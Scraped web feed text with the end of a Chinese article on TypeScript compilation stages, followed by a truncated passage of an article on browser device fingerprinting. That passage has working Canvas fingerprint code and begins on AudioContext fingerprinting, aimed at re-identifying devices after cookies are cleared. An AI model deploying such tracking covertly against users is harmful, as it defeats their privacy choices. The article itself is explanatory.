<span class="hljs-keyword">const</span> calculate = (<span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> x + y;
</code></pre>
<h4 data-id="heading-3">步骤1：词法分析（Lexical Analysis）</h4>
<p>编译器首先将源代码字符串拆分成一个个词法单元（tokens）：</p>
<ul>
<li><code>const</code> (关键字)</li>
<li><code>calculate</code> (标识符)</li>
<li><code>=</code> (运算符)</li>
<li><code>(</code> (分隔符)</li>
<li><code>x</code> (标识符)</li>
<li><code>:</code> (分隔符)</li>
<li><code>number</code> (类型关键字)</li>
<li>...等等</li>
</ul>
<h4 data-id="heading-4">步骤2：语法分析（Syntax Analysis）</h4>
<p>根据TypeScript语法规则，将tokens组合成抽象语法树（AST）：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"VariableDeclaration"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"declarations"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"VariableDeclarator"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Identifier"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"calculate"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"init"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ArrowFunctionExpression"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"params"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Identifier"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"x"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"typeAnnotation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"TypeAnnotation"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"typeAnnotation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"NumberType"</span> <span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-comment">// ... 类似结构</span>
      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"returnType"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"TypeAnnotation"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"typeAnnotation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"NumberType"</span> <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"body"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">/* ... */</span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-5">阶段二：语义分析与类型检查</h3>
<p>这是TypeScript与纯JavaScript编译器（如Babel）的核心区别所在。</p>
<h4 data-id="heading-6">步骤3：创建符号表（Symbol Table）</h4>
<p>编译器遍历AST，收集所有标识符的信息：</p>
<ul>
<li><code>calculate</code>：函数，接收两个number参数，返回number</li>
<li><code>x</code>：参数，类型为number</li>
<li><code>y</code>：参数，类型为number</li>
</ul>
<h4 data-id="heading-7">步骤4：类型检查（Type Checking）</h4>
<p>基于符号表进行类型推断和验证：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 示例1：正确的代码</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">5</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">10</span>;
<span class="hljs-keyword">const</span> result = a + b; <span class="hljs-comment">// ✅ 类型检查通过</span>

<span class="hljs-comment">// 示例2：错误的代码</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">str</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">"hello"</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">num</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">5</span>;
<span class="hljs-keyword">const</span> error = str + num; 
<span class="hljs-comment">// ⚠️ TypeScript会警告：虽然能运行，但可能是逻辑错误</span>
</code></pre>
<h3 data-id="heading-8">阶段三：代码转换与生成</h3>
<h4 data-id="heading-9">步骤5：类型擦除（Type Erasure）</h4>
<p>这是TypeScript设计哲学的关键体现——所有类型信息在运行时都不存在：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 编译前 (.ts)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
    age?: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">user: User</span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">${user.name}</span>!`</span>;
}

<span class="hljs-comment">// 编译后 (.js)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">user</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello, "</span> + user.<span class="hljs-property">name</span> + <span class="hljs-string">"!"</span>;
}
<span class="hljs-comment">// 注意：User接口完全消失了！</span>
</code></pre>
<h4 data-id="heading-10">步骤6：降级转换（Downleveling）</h4>
<p>根据tsconfig.json中的target配置，将现代JavaScript语法转换为目标版本：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 编译前（ES2022）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    #privateField = <span class="hljs-string">"secret"</span>; <span class="hljs-comment">// 私有字段</span>
    
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api'</span>);
        <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();
    }
}

<span class="hljs-comment">// 编译为ES5（target: "es5"）</span>
<span class="hljs-keyword">var</span> <span class="hljs-title class_">User</span> = <span class="hljs-comment">/** <span class="hljs-doctag">@class</span> */</span> (<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params"/>) {
        _privateField.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">"secret"</span>);
    }
    <span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">fetchData</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">__awaiter</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>, <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
            <span class="hljs-keyword">var</span> response;
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">__generator</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">_a</span>) {
                <span class="hljs-comment">// 复杂的转译代码...</span>
            });
        });
    };
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">User</span>;
}());
<span class="hljs-keyword">var</span> _privateField = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();
</code></pre>
<h4 data-id="heading-11">步骤7：代码生成与输出</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># tsc的完整工作流程</span>
输入: src/
├── index.ts        <span class="hljs-comment"># TypeScript源码</span>
├── utils.ts
└── types.ts

处理: tsc编译器
├── 解析所有文件
├── 构建项目引用图
├── 类型检查
├── 转换代码
└── 生成输出

输出: dist/
├── index.js        <span class="hljs-comment"># JavaScript代码</span>
├── utils.js
├── index.d.ts      <span class="hljs-comment"># 类型声明文件（可选）</span>
└── index.js.map    <span class="hljs-comment"># Source Map（可选）</span>
</code></pre>
<h2 data-id="heading-12">类型检查 vs 代码生成的关系</h2>
<h3 data-id="heading-13">分离但协作的两个系统</h3>
<p>TypeScript编译器内部实际上有两个相对独立的子系统：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 概念模型</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeScriptCompiler</span> {
    <span class="hljs-comment">// 类型检查器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">typeChecker</span>: <span class="hljs-title class_">TypeChecker</span>;
    
    <span class="hljs-comment">// 代码生成器（基于JavaScript编译器）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">emitter</span>: <span class="hljs-title class_">Emitter</span>;
    
    <span class="hljs-title function_">compile</span>(<span class="hljs-attr">sourceFile</span>: <span class="hljs-title class_">SourceFile</span>): <span class="hljs-title class_">OutputFile</span>[] {
        <span class="hljs-comment">// 1. 类型检查（可能失败，但不影响继续）</span>
        <span class="hljs-keyword">const</span> diagnostics = <span class="hljs-variable language_">this</span>.<span class="hljs-property">typeChecker</span>.<span class="hljs-title function_">check</span>(sourceFile);
        
        <span class="hljs-comment">// 2. 报告错误（但不停止）</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reportDiagnostics</span>(diagnostics);
        
        <span class="hljs-comment">// 3. 代码生成（无论是否有类型错误）</span>
        <span class="hljs-keyword">const</span> jsCode = <span class="hljs-variable language_">this</span>.<span class="hljs-property">emitter</span>.<span class="hljs-title function_">emit</span>(sourceFile);
        
        <span class="hljs-keyword">return</span> [jsCode];
    }
}
</code></pre>
<h3 data-id="heading-14">关键特性：渐进式检查</h3>
<p>TypeScript采用渐进式类型检查策略：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 文件A.ts - 先编译这个</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-comment">// 文件B.ts - 后编译，依赖于A.ts</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">'./A'</span>;

<span class="hljs-comment">// 即使A.ts有类型错误，B.ts仍然可以：</span>
<span class="hljs-comment">// 1. 获得A.ts的类型信息（可能不完整）</span>
<span class="hljs-comment">// 2. 检查自身代码的类型正确性</span>
<span class="hljs-comment">// 3. 生成JavaScript代码</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">add</span>(<span class="hljs-number">5</span>, <span class="hljs-string">"10"</span>); <span class="hljs-comment">// ❌ 这里会报错</span>
</code></pre>
<h2 data-id="heading-15">为什么有些类型错误不影响运行？</h2>
<h3 data-id="heading-16">案例一：类型系统无法捕获的运行时错误</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScript编译时检查通过 ✅</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> a / b;
}

<span class="hljs-comment">// 运行时可能出错 ❌</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">divide</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// Infinity，可能不是期望的结果</span>
<span class="hljs-keyword">const</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"nonexistent"</span>);
element.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">"hello"</span>; <span class="hljs-comment">// Runtime Error: Cannot read property...</span>
</code></pre>
<h3 data-id="heading-17">案例二：类型断言绕过检查</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">SafeData</span> {
    <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// 编译时：欺骗TypeScript</span>
<span class="hljs-keyword">const</span> unsafeData = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'{"value": 123}'</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">SafeData</span>;

<span class="hljs-comment">// 运行时：没有问题...暂时</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(unsafeData.<span class="hljs-property">value</span>); <span class="hljs-comment">// 123 (number, 不是string!)</span>

<span class="hljs-comment">// 直到这里才可能出错</span>
<span class="hljs-keyword">const</span> length = unsafeData.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>; <span class="hljs-comment">// Runtime Error!</span>
</code></pre>
<h3 data-id="heading-18">案例三：外部JavaScript库</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 假设使用了一个没有类型定义的第三方库</span>
<span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">legacyLib</span>: <span class="hljs-built_in">any</span>; <span class="hljs-comment">// 使用any类型</span>

<span class="hljs-keyword">const</span> result = legacyLib.<span class="hljs-title function_">calculate</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);
<span class="hljs-comment">// TypeScript: ✅ 没有类型错误（因为any）</span>
<span class="hljs-comment">// 运行时: 可能成功，也可能崩溃</span>
</code></pre>
<h2 data-id="heading-19">结语</h2>
<p>本文介绍了TypeScript的核心工作流程，对于文章中错误的地方或者有任何问题，欢迎在评论区留言讨论！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端指纹技术是如何实现的？（Canvas、Audio、硬件API 核心原理解密）]]></title>    <link>https://juejin.cn/post/7596970073750552612</link>    <guid>https://juejin.cn/post/7596970073750552612</guid>    <pubDate>2026-01-20T03:02:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596970073750552612" data-draft-id="7596969908325580854" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端指纹技术是如何实现的？（Canvas、Audio、硬件API 核心原理解密）"/> <meta itemprop="keywords" content="前端,JavaScript,算法"/> <meta itemprop="datePublished" content="2026-01-20T03:02:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端指纹技术是如何实现的？（Canvas、Audio、硬件API 核心原理解密）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:02:21.000Z" title="Tue Jan 20 2026 03:02:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/417e0311f90b43e298db5fab3f7dbcbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=ZG6XdKS5GaPQ1OOE6wNe2d32cv8%3D" alt="Fingerprint-KYS-01-1-1200x596.png" loading="lazy"/></p>
<h3 data-id="heading-0">什么是设备指纹？</h3>
<p>在讲实现之前，先纠正一个误区：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzh.wikipedia.org%2Fwiki%2F%25E8%25A3%259D%25E7%25BD%25AE%25E6%258C%2587%25E7%25B4%258B" target="_blank" title="https://zh.wikipedia.org/wiki/%E8%A3%9D%E7%BD%AE%E6%8C%87%E7%B4%8B" ref="nofollow noopener noreferrer">设备指纹（Device Fingerprint）</a>不是为了知道<strong>你是张三</strong>，而是为了知道 <strong>这台设备是编号 9527</strong>。</p>
<p>它的核心逻辑只有一条：<strong>利用浏览器暴露的硬件底层差异（显卡、声卡、电池、屏幕），组合出极高熵值的唯一 ID。</strong></p>
<p>就算你清空了 Cookie，换了 IP，只要你的硬件没变，这套代码算出来的 Hash 值就永远不变。</p>
<p>下面我们直接上代码，拆解最核心的三种实现方式。</p>
<hr/>
<h3 data-id="heading-1">Canvas 指纹</h3>
<p>这是目前最成熟、识别率最高的技术。</p>
<h4 data-id="heading-2">实现原理</h4>
<p>Canvas 绘图不仅仅依赖浏览器引擎，它极度依赖底层的 <strong>GPU 绘图指令</strong>、<strong>操作系统图形驱动</strong> 以及 <strong>抗锯齿（Anti-aliasing）算法</strong>。</p>
<p>当你命令浏览器<strong>画一个红色的矩形，里面写上 Hello, world!</strong> 时：</p>
<ul>
<li>NVIDIA 的显卡和 AMD 的显卡，在处理边缘像素的混合（抗锯齿）时，算法有微小的数学差异。</li>
<li>Windows 和 Mac 在字体渲染（Sub-pixel rendering）上，对笔画粗细的处理不同。</li>
<li>这就导致了：<strong>同一段 Canvas 代码，生成的图片像素数据（RGBA），在不同设备上是完全不同的。</strong></li>
</ul>
<h4 data-id="heading-3">核心代码实现方式</h4>
<p>我们不需要画多复杂的图，关键是要<strong>触发差异</strong>。通常会用到：光影叠加、异形字体、emoji（检测字体库）。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getCanvasFingerprint</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 1. 创建一个不会挂载到 DOM 上的画布</span>
    <span class="hljs-keyword">const</span> canvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'canvas'</span>);
    <span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
    canvas.<span class="hljs-property">width</span> = <span class="hljs-number">200</span>;
    canvas.<span class="hljs-property">height</span> = <span class="hljs-number">50</span>;

    <span class="hljs-comment">// 2. 文字干扰：利用字体渲染差异</span>
    <span class="hljs-comment">// textBaseline 设为 top/bottom 会触发不同的垂直对齐算法</span>
    ctx.<span class="hljs-property">textBaseline</span> = <span class="hljs-string">"top"</span>;
    ctx.<span class="hljs-property">font</span> = <span class="hljs-string">"14px 'Arial'"</span>;
    ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">"#f60"</span>;
    ctx.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">125</span>, <span class="hljs-number">1</span>, <span class="hljs-number">62</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// 背景块</span>

    <span class="hljs-comment">// 3. 叠加混合：触发 GPU 的颜色混合算法</span>
    ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">"#069"</span>;
    <span class="hljs-comment">// 写入带特殊符号的文字，测试系统字体支持度</span>
    ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">"Hello, world! \ud83d\ude03"</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>);
    
    <span class="hljs-comment">// 再次叠加，利用 rgba 透明度触发抗锯齿差异</span>
    ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">"rgba(102, 204, 0, 0.7)"</span>;
    ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">"Hello, world! \ud83d\ude03"</span>, <span class="hljs-number">4</span>, <span class="hljs-number">17</span>);

    <span class="hljs-comment">// 4. 导出指纹</span>
    <span class="hljs-comment">// toDataURL 会返回 base64 字符串</span>
    <span class="hljs-comment">// 同样的图像，不同显卡生成的 base64 字符串的 CRC 校验码是不同的</span>
    <span class="hljs-keyword">const</span> b64 = canvas.<span class="hljs-title function_">toDataURL</span>().<span class="hljs-title function_">replace</span>(<span class="hljs-string">"data:image/png;base64,"</span>, <span class="hljs-string">""</span>);
    
    <span class="hljs-comment">// 5. 将超长字符串 Hash 化 (这里用简单的 hash 示例，生产环境可用 MurmurHash3)</span>
    <span class="hljs-keyword">let</span> bin = <span class="hljs-title function_">atob</span>(b64);
    <span class="hljs-keyword">let</span> crc = <span class="hljs-title function_">bin2hex</span>(bin.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">16</span>, -<span class="hljs-number">12</span>)); <span class="hljs-comment">// 取部分校验位</span>
    <span class="hljs-keyword">return</span> crc;
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60552ddafb5c453bbf111e2e8dbadc93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=zMjOwJ4R07Zdct%2FnFSHJIQDfmHE%3D" alt="image.png" loading="lazy"/></p>
<p>差异在哪？</p>
<p>肉眼看这两张图是一模一样的。</p>
<p>但如果你把两台电脑生成的 Base64 字符串拿去对比，会发现可能在第 5000 个字符处，有一个字母不一样。那就是显卡留下的签名。</p>
<hr/>
<h3 data-id="heading-4">AudioContext 指纹</h3>
<p>既然显卡有差异，声卡（Audio Stack）自然也有。</p>
<h4 data-id="heading-5">原理</h4>
<p>Audio 指纹不是录音（不需要麦克风权限）。</p>
<p>它是利用 Web Audio API 生成一段数学上的声音信号（正弦波、三角波），然后经过一系列处理（压缩、滤波）。</p>
<p>由于计算机浮点数运算的精度差异，以及底层音频处理单元（DSP）的实现不同，最终生成的<strong>PCM 音频数据流</strong>会有极其微小的差别。</p>
<h4 data-id="heading-6">代码实现</h4>
<p>通常使用 <code>OfflineAudioContext</code><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FOfflineAudioContext" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/OfflineAudioContext" ref="nofollow noopener noreferrer">（离线音频上下文）</a>，它可以在后台静默渲染音频，不需要用户听到声音，速度极快。</p>
